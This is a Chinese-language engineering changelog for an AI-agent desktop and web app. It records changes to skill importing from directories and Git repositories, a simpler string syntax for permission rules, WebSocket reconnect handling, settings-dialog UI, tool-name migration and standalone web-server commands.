  - 用户反馈"启用的 tool 没有读取全局的配置"：当 `session.enabled_tools = Some([])`（历史残留或某些代码路径写入的空 vec）时，旧 fallback 逻辑只检 None 不检空，导致"全局勾了工具但当前对话用不上"

- **改动**:
  - **storage::skills** [crates/agent-core/src/storage/skills.rs](crates/agent-core/src/storage/skills.rs)：新增
    - `list_skills_in_dir(src_dir)`：探测目录是单个 skill 还是 skill 集合
    - `import_from_dir(data_dir, scope, workdir?, src_dir, overwrite)`：从本地目录拷（自动识别单 skill / 集合根）
    - `import_from_github(data_dir, scope, workdir?, repo_url, subpath?, overwrite)`：浅 `git clone --depth=1` 到临时目录后调 `import_from_dir`，结束 cleanup；subpath 为 None 时按常见 layout（root / `skills/` / `.claude/skills/`）自动探测
    - 把 `import_from_claude` 重构成调用共享的 `import_named_from_root` helper，三种导入路径都走同一段落盘逻辑
    - 新增 5 个单元测试覆盖 single skill / collection root / workdir 强校验 / project scope 落盘位置 / list_skills_in_dir 自识别
  - **CoreClient trait + LocalCoreClient** [crates/agent-core/src/core_client/mod.rs](crates/agent-core/src/core_client/mod.rs)：新增 `import_skills_from_dir` / `import_skills_from_github` 两个方法
  - **Tauri commands** [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs)：新增 `import_skills_from_dir` / `import_skills_from_github` 并挂入 `invoke_handler!`
  - **Web-server IPC** [apps/web-server/src/server.rs](apps/web-server/src/server.rs)：对应两个 dispatch 入口与 handler；接受 camelCase（`srcDir` / `repoUrl`）与 snake_case 两种 args 形式
  - **前端 SkillsPane** [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx)：重排 Skills tab
    - 把"导入范围"（global / project）提到三种导入方式的上面统一选一次，避免重复选择器
    - 新增「从本地目录导入」section：调 `@tauri-apps/plugin-dialog` 打开目录选择对话框 → invoke `import_skills_from_dir`
    - 新增「从 Git 仓库导入」section：URL + 可选 subpath 文本框 → invoke `import_skills_from_github`，错误回显 git 没装 / clone 失败
    - 「从 ~/.claude/skills 导入」section 保留，去掉自身的 scope 选择器（统一到顶部）
  - **enabled_tools 兜底（全局生效更稳）**：
    - [apps/desktop/src/chat.rs](apps/desktop/src/chat.rs) send_message 与 preview_session_payload 两处的 fallback 链改为「args > session 非空 > 全局 settings」——session.enabled_tools = `Some([])` 也下沉到全局，去掉"明确为本对话清空"的语义边角（实际无人用，且与"读全局"直觉冲突）
    - 同改 [apps/web-server/src/session.rs](apps/web-server/src/session.rs) / [apps/cli/src/daemon.rs](apps/cli/src/daemon.rs)
    - chat.rs 加 `tracing::debug!` 打印实际生效的 enabled_tools 与各层来源，方便用户后续排查
    - SessionSettingsDialog 的「恢复继承」按钮（setEnabledTools(null)）仍是清空 session 自定义、回到全局的正确入口

- **影响范围**:
  - agent-core / apps/desktop / apps/web-server / apps/cli 全参与；编译 `cargo check --workspace` 通过
  - `cargo test -p agent-core --lib` 218 通过（新增 5 个 skills 导入测试 = 213 → 218）
  - `pnpm tsc --noEmit` 通过
  - **行为变更**：session.enabled_tools = `Some([])` 不再代表"明确不启用任何工具"，会下沉到全局。用户如果真的想"什么工具都不要"只能把全局也清空（产品决策：默认推断"用户没想覆盖"比"用户想清空"更常见）

- **留尾巴**: 无

### 2026-05-21 — 权限规则数据模型彻底简化为 Claude Code 风格字符串 pattern

- **Why**: 用户原话"一个权限就这样了 太复杂了吧"，看到的是
  ```json
  { "id": "...", "scope": "Global", "toolName": "Bash",
    "matcher": { "type": "Bash", "commandPrefix": "xargs" },
    "decision": "Allow", "createdAt": ..., "createdBy": "user" }
  ```
  6 个字段 + 嵌套 matcher = 一个 8 字符串规则的展开形式。Claude Code 用 `Bash(xargs)` 一行字符串表达同样语义，配合"三文件天然分 scope"（global / project / session），干净得多。

- **改动**:
  - **schema 重写** [crates/agent-core/src/storage/permissions.rs](crates/agent-core/src/storage/permissions.rs)：`PermissionsFile { allow: Vec<String>, deny: Vec<String>, paths: Vec<PathBuf> }`，三段平铺
  - **删 `PermissionRule` / `PermissionMatcher` / `PermissionDecisionKind` / `new_rule_id`** [crates/agent-core/src/permissions/mod.rs](crates/agent-core/src/permissions/mod.rs)
  - **新加 `Permission` + `RuleEffect`**：
    - `Permission::parse(raw)` 解析 `<Tool>(<arg>)` 或 `<Tool>` → 内部 Arg 枚举（Any / Bash{cmd,path?} / Path{prefix} / Domain{suffix}）
    - 工具名 `Bash` / `PowerShell` 的 arg 支持 `cmd:path` 冒号分隔表达"命令前缀 + 路径前缀"
    - `WebFetch` / `WebSearch` / `Fetch` arg 解析为域名后缀
    - 其他工具 arg 解析为路径前缀
    - 通配工具名 `*` 仍内部支持（不强制 UI 暴露）
  - **PermissionStore API 全部重写**：`add` / `remove` / `list` / `clear` / `find` / `find_for_segments` / `allows_path` / `effective_paths` / `add_path` / `remove_path` / `list_paths`；签名统一以 `(scope, session_id?, workdir?, effect, pattern)` 为基线
  - **scope 由文件位置隐含**：rule 字符串里**不再带 scope 字段**——global → `~/.hebbian/permissions.json`；project → `~/.hebbian/projects/<enc>/permissions.json`；session → 仅 PermissionStore 内存（不持久化）
  - **hitl.rs**：`build_rule` → `build_pattern(tool, opt_arg)`，输出 `Tool(arg)` 字符串；调用 `store.add(scope, session_id?, workdir?, effect=Allow, pattern)`
  - **dispatch.rs**：路径批准走 `store.add_path(scope, workdir?, path)`，写入 paths 段（不再通过 wildcard "*" 工具 + FilePath rule 表达）
  - **CoreClient trait** [crates/agent-core/src/core_client/mod.rs](crates/agent-core/src/core_client/mod.rs)：
    - 删 `list_permission_rules` / `remove_permission_rule` / `clear_permission_rules`
    - 新增 `list_permissions(scope, sid?, wd?, effect)` / `add_permission(... pattern)` / `remove_permission(... pattern)` / `clear_permissions(...)`
    - `list_permission_paths` / `add_permission_path` / `remove_permission_path` 不变
  - **Desktop Tauri commands**：4 个新命令 `list_permissions` / `add_permission` / `remove_permission` / `clear_permissions` 并挂入 `invoke_handler!`
  - **Web-server IPC**：4 个对应 dispatch + handler；接收 `scope` / `effect` / `pattern` / `sessionId` / `workdir`
  - **前端 PermissionsPane** [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx)：
    - 删除原"全局权限规则"的 matcher 展开渲染（`describeMatcher` 函数 + PermissionRule 类型）
    - 新增 `PatternList` 共用组件：标题 + emptyHint + 输入框 + 列表，颜色（emerald / red）区分 allow / deny
    - Permissions tab 现在显示：「规则语法说明」+「允许 allow」+「拒绝 deny」+「paths 白名单」四段；每段 Enter 即可添加
  - 测试：permissions/mod.rs 新加 10 个测试覆盖 parse / find / deny-overrides-allow / session-precedence / project-isolation / paths-whitelist / list-and-remove；总计 218 → 223 通过

- **影响范围**:
  - **破坏兼容**：旧版本的 `~/.hebbian/permissions.json` 与 `~/.hebbian/projects/<enc>/permissions.json` 文件中 `rules: [...]` 数组**不再被读取**——schema 改 `allow / deny / paths`。按既定原则不做迁移，老规则需重新加（用户原话"不做迁移"）
  - **API 破坏**：CoreClient trait 与 Tauri commands 删除/重命名了 3 个旧命令，新增 4 个。所有 surface 已同步
  - `cargo check --workspace` 通过；`cargo test -p agent-core --lib` 223 通过；`pnpm tsc --noEmit` 通过

- **留尾巴**: 无

### 2026-05-21 — SkillsPane 抽成共享组件；右上角对话设置也能导入 skills

- **Why**: 用户原话"右上角 项目设置/对话设置也要能导入"——SkillsPane 之前只在 AppSettingsDialog（应用全局设置）里出现，新建对话后想给当前项目装个 skill 还得绕一圈到全局。SessionSettingsDialog 就在右上角，理应能直接管理本项目 skills

- **改动**:
  - **抽出共享组件** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：把 AppSettingsDialog 里的 SkillsPane 内联实现整段迁出
  - 新增 `defaultScope?: "global" | "project"` prop，决定打开时默认选哪个 scope：
    - 应用全局设置：`defaultScope="global"`
    - 对话设置：`defaultScope="project"`（有 workdir 时；否则自动回退 global）
  - SkillsPane 内部仍允许用户切换 scope，无 workdir 时"当前项目"选项禁用
  - **AppSettingsDialog** 把内联 SkillsPane 整段删除，改为 `import { SkillsPane } from "./SkillsPane"` 并在 Skills tab 渲染 `<SkillsPane workdir={...} defaultScope="global" />`
  - **SessionSettingsDialog** 新增「Skills」区段，紧跟"启用的工具"，渲染 `<SkillsPane workdir={workdir} defaultScope="project" />`；标题旁配 Sparkles 图标 + 一句话说明
  - 三种导入入口（本地目录 / Git 仓库 / `~/.claude/skills`）在两个 dialog 里行为完全一致

- **影响范围**:
  - 仅前端：抽组件 + 在 SessionSettingsDialog 加一节；后端 IPC 不变
  - `pnpm tsc --noEmit` 通过
  - 行为：原"全局设置 → Skills tab"功能保留；新增"右上角对话设置 → Skills 区段"，默认 scope=project，方便给当前项目添加 skill

- **留尾巴**: 无

### 2026-05-21 — SessionSettingsDialog 的「目录 / Skills / 规则」改为默认折叠

- **Why**: 用户原话"把项目设置里 目录部分 skills 部分 规则部分改成可以折叠的 默认折叠 点击展开"——这三段都是二级配置，常用编辑场景是改 provider / model / agent / stream（首屏），三段长内容默认展开造成视觉过载与滚动负担

- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx)：
    - 新增内联 `<CollapsibleSection title icon defaultOpen description>{children}</CollapsibleSection>` 组件：头部按钮 + chevron 图标（ChevronRight 折叠 / ChevronDown 展开）+ 标题 + 描述，子内容仅在 open=true 时渲染
    - 「目录与工具」段（workdir / allowed_paths / skill_dirs / 启用工具）包成 `<CollapsibleSection title="目录与工具" icon={FolderOpen} ...>`
    - 「Skills」段包成 `<CollapsibleSection title="Skills" icon={Sparkles} ...>`
    - 「规则」段包成 `<CollapsibleSection title="规则" icon={FileText} ...>`
    - 三段全部 `defaultOpen=false`（默认折叠），点击头部展开
    - 顶部 provider / model / agent / system_prompt / stream 五项保持原样（首屏直接可见）

- **影响范围**:
  - 仅前端，单文件修改；`pnpm tsc --noEmit` 通过
  - 行为：原先打开"对话设置"会一次性看到所有 5 块（基本信息 + 目录与工具 + Skills + 规则），现在只看基本信息，剩三块各自一个可点击头部
  - state 是 component 内部，关闭 dialog 再开会回到默认折叠状态——若哪段经常要展开，后续可以加 localStorage 记忆

- **留尾巴**: 无

### 2026-05-21 — 移除「Skill 目录」UI 字段，全程靠 project>global 默认链

- **Why**: 用户原话"项目与工具了这个 skills 目录的设置不要了，就按我们默认项目>全局 这样就行，普通的没有项目的对话 就默认读取全局的就行"——`skill_dirs` 配置项当初是想让用户指定额外 skill 来源路径，但现在三层加载链（`~/.hebbian/skills` / `~/.hebbian/projects/<enc>/skills` / `<workdir>/.claude/skills`）已经覆盖所有合理场景，再保留配置项只会让用户疑惑「我要不要改这个？」

- **改动**:
  - **AppSettingsDialog** [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx)：「对话设置」tab 删除 `<PathListField label="Skill 目录" ...>`
  - **SessionSettingsDialog** [apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx)：「目录与工具」section 删除 `<PathListField label="Skill 目录" ...>`；连带删 `skillDirs` state、`setSkillDirs` setter、`inheritedSkillDirs` 变量、useEffect 中 `setSkillDirs(...)`、`updateSessionSettings` payload 中的 `skill_dirs` 字段
  - 后端字段 `settings.conversation.skill_dirs` 与 `session.skill_dirs` **保留**（serde `#[serde(default)]`，向后兼容老 settings.json）。当为空（默认）时 surface 已经调 `default_skill_dirs(data_dir, workdir)` 拿三层来源，行为符合用户预期
  - 用户若手动编辑 settings.json 加 skill_dirs，后端仍读，但不再提供 UI

- **影响范围**:
  - 仅前端 2 个文件；后端不动
  - `pnpm tsc --noEmit` 通过
  - 行为：无 workdir 的"空对话"读 `~/.hebbian/skills/`；有 project 的对话读 `~/.hebbian/skills/ + ~/.hebbian/projects/<enc>/skills/ + <workdir>/.claude/skills/` 三层，后者覆盖前者同名 skill

- **留尾巴**: 无

### 2026-05-21 — desktop-bridge.ts 加心跳 + 主动 reconnect，hebweb 重启不再死

- **Why**: 真实使用 bridge 时发现：hebweb 被 `kill -9` / 重启后，desktop 前端的 WebSocket 不触发 `onclose`（macOS WKWebSocket 在对端硬关时偶发漏事件），导致 desktop bridge 一直处于"假活"状态——不重连。表现：hebweb 重启 → `bridges:0` 持续 → 浏览器调任何走 bridge 的命令 hang 到 60s 超时
- **修复**:
  - [apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts](../apps/desktop/frontend/src/desktop/bridge/desktop-bridge.ts):
    - 加 10s 心跳：`setInterval` 每隔 10s `ws.send({type:'ping'})`；对端死了 send 抛错或 readyState != OPEN 立刻触发 reconnect
    - 加 `reconnecting` 标志位 + `cleanupAndReconnect(reason)` 统一函数，防止 onerror + onclose 双触发 schedule 出两个重连
    - `onerror` 也触发 reconnect（不只是 onclose）——双保险
  - 后端无需改：hebweb `handle_bridge` 收到未知 `BridgeInbound` variant（`ping` 不在枚举里）会 serde_json::from_str Err，走 `warn!(...); continue;` 路径，安全忽略
- **验证**:
  - kill -9 hebweb → 重启 → 10s 内 desktop bridge 心跳 send 失败触发 reconnect → 新 hebweb `bridges:1` ✓
  - reload 后 Playwright 真实操作用户 session "Bash后台任务显示疑问"：
    - `list_sessions` 走 bridge → 浏览器侧边栏渲染真实 37 个 session
    - hover 右下角 Token 用量小圆环 → 弹出 native tooltip `上下文 25% · 50.3k / 200.0k`（**`get_context_usage` 通过 bridge 实时拿到的真实数据**）
    - 误触压缩按钮 → desktop 真的调 `compact_session` → 模型 API 返回 HTTP 503 → 错误 toast 完整冒到浏览器：`压缩失败: HTTP 503: ... No available accounts`
- **影响范围**: 仅 desktop 前端 60 行修改；不动协议、不动 hebweb 后端；ws 消息 additive（`{type:'ping'}` server 自动忽略）
- **留尾巴**:
  - `ping` 当前是 fire-and-forget，server 不回 pong。若未来要做"server 死活探测"还需要加 `pong` 响应 + client 端 readtimeout（当前依赖 send 失败被动探测，10s 延迟可接受）
  - 心跳间隔 10s 是经验值；过短增加 ws 流量、过长延长断连感知。如果未来场景需要可拉成配置

### 2026-05-21 — Skills UI 收敛 scope，加 markdown 预览；Rules 改为全局/项目分栏列表；dialog 加宽 20%

- **Why**: 用户原话一组改动：
  1. "skills 栏 导入范围就去了，因为在项目设置里就已经是项目范围了 在总设置里范围就是全局了"——scope 由打开的 dialog 决定，UI 不该让用户再选
  2. "导入全局的已经导入的就自动勾上并灰色"——避免重复导入
  3. "整个项目设置/全局设置 左右两边宽度再宽 20%"——Dialog lg size 太窄
  4. "导入的 skill 可以点击某条展开预览（markdown 渲染）"——加预览
  5. "规则分栏 不要那个'读取全局CLAUDE.md'的开关了 就把所有的能读的 rules 文件列出来 从上面是全局的一条线 线上写小字'全局' 下面项目范围 以一个目录分割"——全局开关换成完整列表 + 视觉分组

- **改动**:
  - **Dialog 宽度 +20%** [apps/desktop/frontend/src/desktop/ui/components/ui/dialog.tsx](apps/desktop/frontend/src/desktop/ui/components/ui/dialog.tsx)：`lg: max-w-2xl` (672px) → `lg: max-w-[820px]`；`xl: max-w-4xl` (896px) → `xl: max-w-[1120px]`
  - **SkillsPane 重写** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - props: `defaultScope?` → 必填 `scope: "global" | "project"`，删除内部 scope 切换 Select
    - AppSettingsDialog 传 `scope="global"`；SessionSettingsDialog 传 `scope="project"`
    - 新增 `installedNames` 计算：从已加载 skills 中按当前 scope 取 source==global/project 同名集合
    - 「从 ~/.claude/skills 导入」列表里同名 skill 自动 `checked + disabled`，右侧显示「已导入」标签
    - 已加载 skills 列表每项前面加 ChevronRight/Down 按钮，点击展开 SKILL.md 预览（懒加载 + 缓存）
    - 预览用 `ReactMarkdown` + `remark-gfm`（与 MessageBubble 一致），容器最大高 420px + 内部滚动
    - scope=project 且 workdir=null 时顶部显示橙色提示，三个导入按钮全部禁用
  - **后端 read_skill_md command** [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs)：按 (source, name, workdir?) 三参定位 SKILL.md 文件并返回内容；source 校验 global/project/project_code 三选一
  - **discover_all_rules command** [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs)：合并 `global_candidates` + `default_global_rules()` 过滤出存在的全局规则文件，workdir 给定时叠加 `rules::discover` 项目祖先链结果；统一返回带 source 的 RuleFileInfo 列表
  - **SessionSettingsDialog 规则段重写** [apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx](apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx)：
    - 删除「读取全局 CLAUDE.md」switch 开关 + 整段相关代码
    - useEffect 改调 `discover_all_rules`，传 `globalCandidates: session.global_rules ?? null`
    - 新加 `RulesList` 组件：按 source 分两段渲染——「全局」section 顶部小字 label + 列表；中间 `border-t` 分隔；「项目」section 同形态，每项前 wd/allowed 来源徽章
    - 复选框（圆点）样式：启用 = primary 色实心；禁用 = muted-foreground/30 实心
    - 全局复选框 toggle 改 session.global_rules（含/不含）；项目复选框 toggle 改 session.rules_files

- **影响范围**:
  - 前端 3 文件 + Dialog 全局 size 调整；后端 desktop lib.rs 加两个 Tauri command
  - `cargo check --workspace` 通过；`pnpm tsc --noEmit` 通过
  - 行为：所有用 `size="lg"` 的 Dialog（AppSettings / SessionSettings 等）变宽，视觉空间多 ~20%；Skills 预览首次点击拉一次后缓存到 component state（关 dialog 重开会重新拉）；规则文件 UI 不再有"全局开关"，每个文件独立勾选

- **留尾巴**: 无

### 2026-05-21 — 启动定位最新对话所属项目；右上角按钮按 project_id 判定 label

- **Why**: 用户原话"程序启动时，最新一个对话如果属于一个项目，则左侧默认显示其项目列，右上角也是项目设置，如果是普通对话，则右上角是对话设置"——以前启动总是「全部」模式，用户得手动点「项目 → 选某项目」找到自己的会话；右上角按钮 label 之前看 workdir，普通对话只要有 workdir 也会误显示「项目设置」

- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](apps/desktop/frontend/src/desktop/ui/store/useStore.ts) `init()`：
    - 拿 `sessions[0]`（按 updated_at 排序的最新对话）后，判断它的 `project_id` 是否还在已加载的 projects 列表里
    - 若是，启动时 `set({ projectSidebarMode: "projects", selectedProjectId: first.project_id })`——侧栏直接进项目模式 + 锁定到该项目
    - 普通对话（`project_id == null` 或 project 已被删）保持「全部」模式默认
  - [apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx](apps/desktop/frontend/src/desktop/ui/components/ChatView.tsx) 右上角按钮：从 `currentSession?.workdir && workdir !== "~/" && workdir !== "~"` 改为 `currentSession?.project_id`——`workdir` 普通对话也可能有，`project_id` 才是"属于一个项目"的权威信号

- **影响范围**:
  - 仅前端 2 文件；后端不动
  - `pnpm tsc --noEmit` 通过
  - 行为：启动后若最新对话属于项目 → 侧栏自动 = 项目模式 + 选中该项目，右上角显示「项目设置」；否则默认「全部」模式 + 右上角「对话设置」
  - 不破坏已有 selectedProjectId：用户手动切回「全部」、关闭再开后下次启动仍按 sessions[0] 的归属重新定位

- **留尾巴**: 无

### 2026-05-21 — 修复全局 enabled_tools 老 snake_case 命名无法继承的 bug

- **Why**: 用户原话"现在全局是启用的，然后新建对话启用的工具都没有选中"。诊断：用户的 `~/.hebbian/settings.json` 里 `conversation.enabled_tools` 写的是 `["web_search","web_fetch"]`（老 snake_case），但当前 [tool_manifest()](crates/agent-core/src/tools/mod.rs) 暴露给 UI 的工具名是 PascalCase（`"WebSearch"` / `"Fetch"`）。两边对不上 → ToolToggleList 渲染时 `enabledSet.has(t.name)` 永远 false → UI 全不勾选；运行时 agent_loop 过滤工具时也命中不上 → web 工具实际从未启用。
  这是命名规范早期摇摆遗留的脏数据。

- **改动**:
  - [crates/agent-core/src/storage/settings.rs](crates/agent-core/src/storage/settings.rs) `load()`：
    - 反序列化后 normalize `conversation.enabled_tools`：`web_search` → `WebSearch`、`web_fetch` / `WebFetch` → `Fetch`、`image_generation` → `IMAGE_GENERATION_TOOL_NAME`，其他名字透传
    - normalize 后若与原值不同**透明回写盘**（一次性迁移），下次启动直接是新名字
  - 新增两个单元测试：
    - `normalize_maps_legacy_snake_case_to_pascal`：纯函数映射验证
    - `load_rewrites_legacy_tool_names_to_disk`：写入老 settings.json、load 后值正确 + 盘文件已被改写

- **影响范围**:
  - 仅 storage::settings；其他模块不变
  - `cargo check --workspace` 通过；agent-core 225 测试全过（新增 2 个）
  - 行为：所有现存用户的 `~/.hebbian/settings.json` 下次启动会一次性迁移，UI 立刻显示正确勾选，agent 运行时真启用对应工具
  - 没动 session.jsonl Meta / meta.json 中的 `enabled_tools`——新建对话默认继承全局（已修），老 session 自己的覆盖值若也是老名字会留下小缺陷；用户可在「对话设置」点「恢复继承」（设 enabled_tools = null）让它重新读全局

- **留尾巴**: 无

### 2026-05-21 — Skill 预览改全屏 modal + 修 read_skill_md 路径拼接 bug

- **Why**:
  1. 用户报：点 SKILL 预览失败 `读取 /Users/ricardo/.hebbian/skills/karpathy-guidelines/SKILL.md 失败：No such file`。诊断：用户的 skill 目录是 `karpathy/`，frontmatter 写 `name: karpathy-guidelines`。旧版本 `Skill.name` 用 frontmatter name → `read_skill_md(source, name, workdir)` 后端按 `<root>/skills/<name>/SKILL.md` 拼路径找不到文件
  2. 用户原话要求预览改成"放大框、跟 tool_call 详情放大框一样大小"，并"md 的 metadata 部分不渲染往下正文部分 markdown 渲染"

- **claude code 行为对齐**（[loadSkillsDir.ts:423-431](/Users/ricardo/code/ricardo/claude-code-haha/src/skills/loadSkillsDir.ts#L423-L431)）：
  - claude code 只查一层 `<skills_dir>/<dir-name>/SKILL.md`，**不递归**
  - `name` 用**目录名**（`entry.name`），frontmatter 的 `name` 仅当 `displayName`
  - hebbian 之前用 frontmatter name 是错误（与 claude code 不符且导致定位失败）

- **改动**:
  - **后端**：
    - [crates/agent-core/src/tools/skill.rs](crates/agent-core/src/tools/skill.rs) `load_dir_into`：保持一层扫不变（与 claude code 一致），但 `Skill.name` 改用**目录名**而不是 frontmatter name；frontmatter 的 name 字段先不使用（如需 displayName 后续再加 `display_name` 字段）。撤回上一轮误改的递归扫描方案
    - [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs) `read_skill_md`：签名从 `(source, name, workdir?)` 改为 `(path: PathBuf)`，直接读 `list_skills` 返回的 `path`；校验 `path.file_name() == "SKILL.md"` 防任意路径读
  - **前端 SkillsPane** [apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx](apps/desktop/frontend/src/desktop/ui/components/SkillsPane.tsx)：
    - 删除内嵌展开 + chevron 按钮 + `contentCache` / `expanded` / `loadingContent` 旧 state
    - 新增 `previewSkill` / `previewContent` / `previewLoading` state
    - 点击 skill 行直接打开**全屏 modal**：`fixed inset-0 z-[110]` + 半透明 backdrop + `inset-3` 内框，与 MessageBubble 工具放大形态一致（z-[110] 高于 Dialog z-[100] 保证盖住父 SessionSettingsDialog）
    - modal header 显示 skill name + path；body 用 `ReactMarkdown` + `remark-gfm` 渲染
    - 新增 `stripFrontmatter()` 工具：跳过 `---\n...\n---\n` YAML 头，只渲染正文
    - `read_skill_md` 调用从 `(source, name, workdir)` 改为传 `path: s.path`

- **影响范围**:
  - 后端 2 文件 + 前端 1 文件；`cargo check --workspace` 通过；`pnpm tsc --noEmit` 通过
  - 行为：所有 skill 的 `Skill.name` 现在 = 目录名（与 claude code 行为对齐 + 用户的 karpathy-guidelines 这类目录名↔frontmatter name 不一致的场景现在工作正常）；点击预览打开全屏放大框，关闭点 backdrop / × 都行；frontmatter 头部不显示

- **留尾巴**: 无

### 2026-05-21 — hebweb standalone Round 1：复刻 7 个 desktop 命令，不依赖 bridge

- **Why**: 用户洞察："tauri rust 与前端之间数据传输是 ipc 调用——为什么不能单独起前端 + 单独起 heb cli 那种后端，前端连后端不就行了？" 完全对。bridge 路线（让 desktop 当 invoke proxy）依赖 desktop 在跑；真正想 unattended 跑就要 hebweb 自己镜像 desktop 命令。这一笔是 standalone 路线 Round 1
- **关键设计**:
  - **bridge / standalone 双轨共存**：dispatch_invoke 优先 bridge（desktop 在跑时零工作量复用 desktop 完整命令集），不在场时 fallback 到 hebweb 自己镜像的命令
  - **复刻而非抽 agent-core 共享 crate**：按 surgical change 原则——desktop chat.rs 是核心文件，refactor 牵动太多。当函数体确实"同构"时（context_usage / send_once）双份等价代码可接受。v2 真要消除重复再做 surface_commands crate
  - **本轮 7 个命令选型**：跳过 build_preview_payload（150+ 行，依赖多个 desktop 内部 preview helper）；选了所有"简单 wrap + 高频"的：context_usage / compact_session / generate_session_title / discover_rules_files / list_background_tasks / kill_background_task / update_session_settings
- **改动**:
  - [apps/web-server/src/chat_helpers.rs](../apps/web-server/src/chat_helpers.rs): 新建，复刻 desktop chat.rs 的 `ContextUsageDto / context_usage / compact_session / send_once` 以及 title_gen.rs 的 `try_generate_title / fallback_from_first_user`。共 ~200 SLOC
  - [apps/web-server/src/main.rs](../apps/web-server/src/main.rs): mod 引入 chat_helpers
  - [apps/web-server/src/server.rs](../apps/web-server/src/server.rs):
    - dispatcher 加 7 个新分支
    - 末尾新增 7 个 `cmd_*` handler：`cmd_get_context_usage / cmd_compact_session / cmd_generate_session_title / cmd_discover_rules_files / cmd_list_background_tasks_local / cmd_kill_background_task_local / cmd_update_session_settings`
    - 内置 `ForcedModelClient` adapter（per-call 覆盖 ModelRequest.model 字段，让 compact_session 用 session.model 而不是 provider.default_model）
- **验证**（hebweb standalone，bridges=0）:
  - 起 hebweb `--port 38080 --data-dir /tmp/hebweb-r1`（无 bridge）
  - WS 烟测 7 命令全通：
    - `get_context_usage` → `{used_tokens:0, budget_tokens:200000}` 真实计算
    - `discover_rules_files {workdir:'/tmp', allowedPaths:['/tmp']}` → 真扫返回 0 项
    - `list_background_tasks` → 真扫 background registry
    - `kill_background_task {taskId:'nope'}` → 合理报错 "未找到 task_id"
    - `update_session_settings {enabledTools:['Read','Grep']}` → 真改并落盘
    - `generate_session_title` 无 user msg → 直接返回原 session
    - `compact_session` provider 不存在 → 合理报错
- **影响范围**:
  - 仅 hebweb 内部（+ chat_helpers.rs / + 7 个 handler）；不动 desktop / agent-core / protocol
  - hebweb 命令总数 35 → 42
  - bridge 接上时仍然优先走 bridge（这些 standalone handler 走 fallback）；bridge 没有时直接 standalone 跑
- **留尾巴**:
  - **build_preview_payload 未做**——hover 消息气泡看"模型 payload" 需要拷贝 desktop chat.rs 整段 preview pipeline（~200 行 + 多个 helper），单独 PR 做
  - **Edits 历史 4 个**（list_edits / diff_edit / revert_edit / edits_worktree_status）—— 依赖 EditsWorktree git，独立工程，下一 Round
  - **OAuth 14 个 + 2 个 file import**——固有限制（OAuth callback deep link / file dialog Tauri native），需要前端 transport 层改造，浏览器走替代方案。这两类长期可能始终需要 bridge
  - **chat_helpers.rs 与 desktop chat.rs 是双份代码**——v2 抽 surface_commands crate 时合并；当前 ~200 SLOC 重复可控
  - hebweb 默认 addr 仍是 `127.0.0.1:3030`；如果要接 bridge 还得记得加 `--addr [::]:38080`（详见前一笔 IPv6 修复 changelog）

### 2026-05-21 — Skills 导入加扫描+分组选择 UX；启用/禁用 toggle；递归发现

- **Why**:
  1. 用户原话"很多 github 仓库 不是只有一个 skills 一般是有一个目录 或者多个目录 每个目录里面有一个 skills，扫描应该能把目录当做一个小子集来展示"——常见仓库布局是 `repo/category/skill-name/SKILL.md` 多层嵌套，旧 import_from_dir 只能扫一层
  2. 用户原话"导入一个仓库后，也可以选择哪些启用那些不启用"——已导入的 skill 想在不删除的前提下临时关掉
  3. claude code 自己只扫一层是因为 `~/.claude/skills/` 用户自己管理；**从外部仓库导入**时递归是合理的（已确认 claude code 不递归，但我们的"导入"场景与 claude code 的"加载"场景不一样）

- **改动**:
  - **storage::skills 扩展**：
    - 新增 `ScannedSkill { name, relative_path, description, dir_path }`：`dir_path` 是 SKILL.md 所在目录的**绝对路径**，做为唯一 key + import 时直接拷贝源；`relative_path` 给前端按第一段分组用
    - 新增 `scan_skill_dir(src_dir)`：递归（深度上限 8、跳过 `.xxx` / node_modules / target）找所有 SKILL.md 目录，"找到一个不再深入"（避免一个 skill 内嵌套被重复采集）
    - 新增 `scan_skill_github(repo_url, subpath?)`：浅 clone 到临时目录 → 扫描 → 清理
    - `import_from_dir` / `import_from_github` 加 `selected_paths: Option<&[String]>` 参数（用 dir_path 字符串匹配）
    - 新增 `DisabledSkillsFile` + `disabled_path` + `load_disabled` / `save_disabled` / `set_skill_enabled` / `apply_disabled` 全套 disabled 持久化
  - **Skill 结构** [crates/agent-core/src/tools/skill.rs](crates/agent-core/src/tools/skill.rs)：加 `enabled: bool` 字段
  - **default_tools** [crates/agent-core/src/tools/mod.rs](crates/agent-core/src/tools/mod.rs)：加载 skills 后调 `apply_disabled` + 过滤 `enabled == false` 的，**不暴露给模型**
  - **CoreClient trait** [crates/agent-core/src/core_client/mod.rs](crates/agent-core/src/core_client/mod.rs)：
    - 新增 `scan_skill_dir` / `scan_skill_github` 两个接口
    - `import_skills_from_dir` / `import_skills_from_github` 加 `selected_paths` 参数
    - 新增 `set_skill_enabled(name, enabled)` 接口
    - `list_skills` 调用方拿到的 Skill 已带 `enabled` 字段（由 `apply_disabled` 填充）
  - **Tauri commands** [apps/desktop/src/lib.rs](apps/desktop/src/lib.rs)：`scan_skill_dir` / `scan_skill_github` / `set_skill_enabled` 三个新命令并挂入 `invoke_handler!`
